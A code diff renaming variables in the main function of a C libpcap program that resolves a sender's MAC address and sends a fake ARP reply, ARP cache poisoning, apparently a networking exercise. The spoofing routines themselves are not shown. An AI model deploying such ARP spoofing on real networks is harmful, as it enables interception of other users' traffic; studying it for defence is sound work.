@@ -4,9 +4,9 @@ int main(int argc, char** argv){
     pcap_t *handle;   /* Session handle */
     char *dev;  /* device to communication */
     char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
-    struct ether_addr MyMac;   /* my mac address */
+    struct ether_addr LocalMac;   /* my mac address */
     struct ether_addr SenderMac;
-    struct in_addr MyIP, SenderIP, TargetIP;
+    struct in_addr LocalIP, SenderIP, TargetIP;
     /* Check argument count */
     if(argc != 4){
         printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
@@ -35,31 +35,31 @@ int main(int argc, char** argv){
         fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
         return 2;
     }
-    /* Get My IP addr */
-    if(GetMyIP(&MyIP, dev) != 1){
+    /* Get Local IP addr */
+    if(GetLocalIP(&LocalIP, dev) != 1){
         fprintf(stderr, "Couldn't get IPv4\n");
         return 2;
     }
 
-    printf("My IP is %s\n",inet_ntoa(MyIP));
+    printf("Local IP is %s\n",inet_ntoa(LocalIP));
 
     printf("**********************************\n");
     printf("Get Local Mac Address...\n");
 
     /* Get Local Mac Address */
-    if(GetMyMac(&MyMac, dev) != 1){
+    if(GetLocalMac(&LocalMac, dev) != 1){
         fprintf(stderr, "Couldn't Get local Mac Address\n");
         return 2;
     }
 
     printf("Success!!\n");
-    printf("Local Mac Address is %s\n",ether_ntoa(&MyMac));
+    printf("Local Mac Address is %s\n",ether_ntoa(&LocalMac));
 
     printf("**********************************\n");
     printf("Get Sender Mac Address...\n");
 
     /* Get Sender Mac Address */
-    if(GetSenderMac(handle, MyMac, MyIP, SenderIP, &SenderMac) != 1){
+    if(GetSenderMac(handle, LocalMac, LocalIP, SenderIP, &SenderMac) != 1){
         fprintf(stderr, "Couldn't Get Sender Mac Address\n");
         return 2;
     }
@@ -67,10 +67,10 @@ int main(int argc, char** argv){
     printf("Sender Mac Address is %s\n",ether_ntoa(&SenderMac));
     printf("**********************************\n");
     printf("Attack Start\n");
-    printf("Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&MyMac));
+    printf("Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&LocalMac));
 
     /* Generate Fake Arp Reply Packet and send */
-    if(AttackPacket(handle,SenderMac,MyMac,TargetIP,SenderIP) != 1){
+    if(AttackPacket(handle,SenderMac,LocalMac,TargetIP,SenderIP) != 1){
         fprintf(stderr, "Couldn't Attack\n");
         return 2;
     }
